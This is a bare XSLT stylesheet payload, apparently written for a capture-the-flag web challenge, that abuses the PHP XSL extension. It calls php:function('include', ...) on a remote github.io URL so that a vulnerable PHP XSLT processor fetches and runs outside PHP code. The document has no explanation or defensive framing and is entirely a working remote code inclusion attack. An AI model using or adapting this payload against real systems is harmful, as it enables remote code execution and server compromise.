<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" version="1.0">
  <xsl:template match="/">
    <xsl:value-of name="assert" select="php:function('include', 'https://tim-xd.github.io/web-server/ch50/index.php')"/>
  </xsl:template>
</xsl:stylesheet>
